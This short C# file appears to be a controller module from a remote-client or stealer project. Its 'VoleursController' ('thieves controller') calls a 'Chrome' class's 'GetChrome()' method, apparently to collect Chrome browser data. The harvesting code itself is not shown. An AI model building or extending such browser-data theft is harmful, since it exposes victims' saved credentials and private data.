using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace ClIENT_PC.Controller
{
    class VoleursController : ControllerBase
    {
        public string Voleurs()
        {
            Chrome ch = new Chrome();
            return ch.GetChrome();
        }
    }
}
